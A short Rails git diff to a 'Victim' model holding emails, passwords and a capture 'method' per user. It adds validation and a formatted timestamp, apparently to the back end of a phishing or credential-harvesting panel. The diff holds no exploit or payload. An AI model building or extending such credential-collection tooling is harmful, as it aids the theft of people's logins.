@@ -1,10 +1,15 @@
 class Victim < ApplicationRecord
+  validates :email, :password, presence: true
   validates_format_of :email, with: /\A([^@\s]+)@((?:[-a-z0-9]+\.)+[a-z]{2,})\Z/i
   
   belongs_to :user
 
   def decrypt
     decrypt_pass = password
+  end
+
+  def friendly_created_at
+    created_at.strftime("%H:%M, %B %e, %Y")
   end
 
 
@@ -14,7 +19,7 @@ class Victim < ApplicationRecord
       email: email,
       password: decrypt,
       method: method,
-      created_at: created_at
+      created_at: friendly_created_at
     }
   end
 end
